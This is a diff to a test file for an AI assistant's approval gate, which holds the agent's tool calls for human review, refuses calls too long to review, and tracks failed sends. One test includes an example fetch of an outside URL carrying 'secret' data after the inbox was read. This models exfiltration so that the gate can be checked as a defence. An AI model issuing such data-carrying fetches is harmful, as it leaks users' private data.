@@ -114,7 +114,7 @@ describePg("tethr assistant gate — approvals", () => {
     expect(held).toHaveLength(1);
     expect(held[0]).toMatchObject({ status: "gated", sensitivity: "external", routeRunId: run.id, title: "Email to mark@travelwithwandr.com — “Checklist”" });
     expect(held[0].approvalId).toBeTruthy();
-    expect(held[0].body).toContain("**Subject:** Checklist");
+    expect(held[0].body).toContain("Subject: Checklist");
   });
 
   it("approve → wakes the chat → the identical call runs once → closes as done", async () => {
@@ -201,5 +201,63 @@ describePg("tethr assistant gate — approvals", () => {
     const out = decisionOf(await handlePreToolUse(db, ctx, { tool_name: "Write", tool_input: { file_path: path.join(os.homedir(), "Desktop", "x.md") } }));
     expect(out.permissionDecision).toBe("deny");
     expect(decisionOf(await handlePreToolUse(db, ctx, { tool_name: "Bash", tool_input: { command: "ls" } })).permissionDecision).toBe("deny");
+  });
+
+  it("shows every field of a held call in full, as plain text", async () => {
+    await updateIntegrations(companyId, { connectors: { Gmail: { mode: "ask" } } }); // back from the auto test
+    const run = await turnRow();
+    const long = "x".repeat(6000) + " TAIL";
+    await handlePreToolUse(db, { companyId, threadId, runId: run.id }, {
+      tool_name: SEND,
+      tool_input: { to: ["mark@travelwithwandr.com"], subject: "Full", body: long, html_body: "<b>other</b>" },
+    });
+    const card = (await cards()).find((c) => c.title.includes("Full"))!;
+    expect(card.body).toContain(" TAIL");
+    expect(card.body).toContain("html_body");
+    expect(card.body).not.toContain("**");
+  });
+
+  it("refuses a call too big to review instead of truncating it", async () => {
+    const run = await turnRow();
+    const d = decisionOf(
+      await handlePreToolUse(db, { companyId, threadId, runId: run.id }, {
+        tool_name: SEND,
+        tool_input: { to: ["mark@travelwithwandr.com"], subject: "Huge", body: "y".repeat(40_000) },
+      }),
+    );
+    expect(d.permissionDecision).toBe("deny");
+    expect(d.permissionDecisionReason).toMatch(/too long to review/);
+  });
+
+  it("asks before opening outside web pages once the thread has read connector data", async () => {
+    const fresh = "cccccccc-cccc-4ccc-8ccc-cccccccccccc";
+    const [row] = await db
+      .insert(tethrRouteRuns)
+      .values({ companyId, requestText: "research", invocationSource: "chat", threadId: fresh, status: "running", hops: [] })
+      .returning();
+    const ctx = { companyId, threadId: fresh, runId: row.id };
+    const fetch = (url: string) => ({ tool_name: "WebFetch", tool_input: { url, prompt: "summarise" } });
+    expect(decisionOf(await handlePreToolUse(db, ctx, fetch("https://example.com/a"))).permissionDecision).toBe("allow");
+    // Reading the inbox taints the thread…
+    expect(decisionOf(await handlePreToolUse(db, ctx, { tool_name: "mcp__claude_ai_Gmail__search_threads", tool_input: {} })).permissionDecision).toBe("allow");
+    // …so an outside page now needs Mark (a URL can carry data out), Wandr's own doesn't.
+    const held = decisionOf(await handlePreToolUse(db, ctx, fetch("https://example.com/c?d=secret")));
+    expect(held.permissionDecision).toBe("deny");
+    expect(held.permissionDecisionReason).toMatch(/sent to Mark for approval/);
+    expect(decisionOf(await handlePreToolUse(db, ctx, fetch("https://www.travelwithwandr.com/malaria"))).permissionDecision).toBe("allow");
+  });
+
+  it("doesn't mark an approved call as sent when it failed", async () => {
+    const run = await turnRow();
+    const ctx = { companyId, threadId, runId: run.id };
+    const input = { to: ["mark@travelwithwandr.com"], subject: "Will fail", body: "z" };
+    await handlePreToolUse(db, ctx, { tool_name: SEND, tool_input: input });
+    const card = (await cards()).find((c) => c.title.includes("Will fail"))!;
+    await gatingService(db).decide({ companyId, outputId: card.id, decision: "approve", reviewer: "local-board" });
+    expect(decisionOf(await handlePreToolUse(db, ctx, { tool_name: SEND, tool_input: input })).permissionDecision).toBe("allow");
+    await handlePostToolUse(db, ctx, { tool_name: SEND, tool_input: input, tool_response: { isError: true, content: [{ type: "text", text: "quota" }] } });
+    const [after] = await db.select().from(tethrOutputs).where(eq(tethrOutputs.id, card.id));
+    expect(after.status).toBe("approved");
+    expect((after.meta as Record<string, any>).grant.status).toBe("failed");
   });
 });
